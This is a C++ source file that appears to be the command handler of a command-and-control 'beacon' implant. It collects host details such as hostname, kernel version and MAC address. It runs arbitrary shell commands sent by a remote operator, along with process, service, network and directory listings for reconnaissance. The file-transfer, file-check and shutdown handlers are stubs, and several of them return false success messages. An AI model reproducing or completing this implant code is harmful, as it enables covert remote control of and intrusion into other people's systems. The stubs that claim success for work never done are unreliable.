#include <iostream>
#include <vector>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <sstream>
#include <string>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>


std::string executeShellCommand(const char* cmd) {
    std::array<char, 2048> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::string getMacAddress() {
    int fd;
    struct ifreq ifr;
    char iface[] = "eth0"; // Change this to the appropriate network interface

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        return "Error retrieving MAC address";
    }

    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        return "Error retrieving MAC address";
    }

    close(fd);

    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    char mac_address[18];
    snprintf(mac_address, sizeof(mac_address), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return std::string(mac_address);
}

std::string getSystemInfo() {
    std::stringstream ss;

    struct utsname uname_info;
    if (uname(&uname_info) != 0) {
        perror("uname");
        return "Error retrieving system info";
    }

    std::string mac_address = getMacAddress();

    ss << "System = " << uname_info.sysname << "\n"
       << "platform-release = " << uname_info.release << "\n"
       << "platform-version = " << uname_info.version << "\n"
       << "architecture = " << uname_info.machine << "\n"
       << "hostname = " << uname_info.nodename << "\n"
       << "mac-address = " << mac_address << "\n"
       << "processor = " << uname_info.machine << "\n";

    return ss.str();
}

std::string command_handler(const std::string& command, const std::string& command_data, const std::string& uuid){
    if (command == "shutdown") {
        // Implement shutdown logic
        return "Not implemented.";
    } else if (command == "switch_beacon") {

        return "Not Implemented";
    } else if (command == "shell") { // need to check if it starts with shell, limitation of current beacon on server
        std::string output = executeShellCommand(command_data.c_str());
        std::cout << "Shell command output: " << output << std::endl;
        return output;
    } else if (command == "list_processes") {
        std::string output = executeShellCommand("ps aux");
        return output;
    } else if (command == "systeminfo") {
        std::string output = getSystemInfo();
        return output;
    } else if (command == "checkfiles") {
        // Implement checkfiles logic
        // Example: verify integrity of specific files
        return "File check completed.";
    } else if (command == "send_file") {
        // Implement send_file logic
        return "File sent successfully.";
    } else if (command == "recv_file") {
        // Implement recv_file logic
        return "File received successfully.";
    } else if (command == "list_services") {
        // Implement list_services logic
        std::string output = executeShellCommand("service --status-all");
        return output;
    } else if (command == "disk_usage") {
        // Implement disk_usage logic
        std::string output = executeShellCommand("df -h");
        return output;
    } else if (command == "netstat") {
        // Implement netstat logic
        std::string output = executeShellCommand("netstat -tuln");
        return output;
    } else if (command == "list_dir") {
        // Implement list_dir logic
        std::string output = executeShellCommand("ls -la");
        return output;
    } else {
        std::cerr << "Unknown command: " << command << std::endl;
    }
    return "not a supported command";
}
